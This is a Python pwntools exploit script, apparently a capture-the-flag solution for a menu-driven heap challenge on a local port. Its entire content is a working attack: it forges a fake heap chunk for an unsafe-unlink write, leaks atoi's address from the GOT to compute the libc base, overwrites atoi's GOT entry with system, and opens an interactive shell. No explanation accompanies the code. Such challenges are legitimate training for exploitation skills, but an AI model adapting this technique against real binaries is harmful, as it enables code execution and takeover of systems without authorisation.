#!/usr/bin/env python
from pwn import *

r = remote("127.0.0.1",8889)

def ad(size,name):
        r.recvuntil(":")
        r.sendline("2")
        r.sendline(str(size))
        r.recvuntil(":")
        r.sendline(name)

def show():
        r.recvuntil(":")
        r.sendline("1")

def change(index,size,name):
        r.recvuntil(":")
        r.sendline("3")
        r.recvuntil(":")
        r.sendline(str(index))
        r.recvuntil(":")
        r.sendline(str(size))
        r.recvuntil(":")
        r.sendline(name)

def rm(index):
        r.recvuntil(":")
        r.sendline("4")
        r.recvuntil(":")
        r.sendline(str(index))

ad(0x40,"aabb")
ad(0x80,"ccdd")
ad(0x40,"aabb")
ptr = 0x6020c8
fake = p64(0)+p64(0x41)
fake += p64(ptr-0x18)
fake += p64(ptr-0x10)
fake += "a"*0x20
fake += p64(0x40)
fake += p64(0x90)
change(0,0x80,fake)
rm(1)
atoi_got = 0x000000000602068
payload = p64(0)*2
payload += p64(0x40)+p64(atoi_got)
change(0,0x80,payload)
show()
r.recvuntil("0 : ")
atoi_addr = u64(r.recvuntil("\n")[:6].ljust(8,"\x00"))
#print(atoi_addr)
atoi_off = 0x36e80
libc = atoi_addr - atoi_off
sys_off = 0x45390
sys_addr = libc +sys_off
change(0,0x8,p64(sys_addr))
ad(0x40,"ddaa")

r.interactive()

